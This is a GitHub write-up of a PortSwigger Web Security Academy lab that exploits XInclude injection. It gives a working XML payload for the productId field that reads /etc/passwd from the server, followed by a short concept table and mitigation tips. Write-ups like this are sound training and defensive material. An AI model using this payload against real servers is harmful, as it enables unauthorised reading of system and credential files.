

### 📁 `README.md` — Exploiting XInclude to Retrieve Files

# 📂 Exploiting XInclude to Retrieve Files

**🧪 Lab Level:** Practitioner  
**🔐 Vulnerability:** XML External Entity Alternative via XInclude  
**✅ Status:** Solved  
**🛠 Platform:** PortSwigger Web Security Academy  
**🎯 Objective:** Retrieve `/etc/passwd` using an XInclude injection instead of classic XXE.

---

## 🔍 Lab Overview

This lab uses XML parsing where the user input is embedded inside a server-side XML document.  
Because you **do not control the entire XML document**, **classic DTD-based XXE attacks are impossible**.

The solution: exploit **XInclude** to fetch and include local files like `/etc/passwd`.

---

## ⚙️ Exploitation Steps

### 1. 🕵️ Intercept the Request

On a product page, click **"Check stock"** and intercept the POST request in **Burp Suite**.

The XML payload looks like this:

```xml
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
````

---

### 2. 🎯 Inject XInclude Payload

Modify the `productId` value to the following XML snippet:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

The modified request snippet will be:

```xml
<stockCheck>
  <productId>
    <foo xmlns:xi="http://www.w3.org/2001/XInclude">
      <xi:include parse="text" href="file:///etc/passwd"/>
    </foo>
  </productId>
  <storeId>1</storeId>
</stockCheck>
```

---

### 3. 📡 Analyze the Response

The server will process the XInclude directive and include the contents of `/etc/passwd` as plain text in the response.

This confirms the XML parser supports **XInclude processing** and can be abused to read local files.
![XXE](https://github.com/Kabilala/xxe/blob/main/lab7/lab7.png)
---

## 🧠 Technical Insight

| Concept        | Explanation                                                                |
| -------------- | -------------------------------------------------------------------------- |
| **XInclude**   | XML standard allowing inclusion of external resources within XML documents |
| `xmlns:xi`     | XML namespace declaration for XInclude                                     |
| `<xi:include>` | Directive to include the content of the specified resource                 |
| `parse="text"` | Specifies inclusion as raw text, avoiding XML parsing issues               |

---

## 🔐 Mitigation Strategies

* Disable **XInclude processing** in XML parsers if unused
* Use **input validation and sanitization** to prevent XML injection
* Implement **least privilege** to limit file system access by XML parsers
* Monitor for unexpected file access in server logs

---

## 📚 References

* [PortSwigger Academy: XInclude Injection](https://portswigger.net/web-security/xml/xinclude)
* [W3C XInclude Specification](https://www.w3.org/TR/xinclude/)
* [OWASP XML External Entity (XXE) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)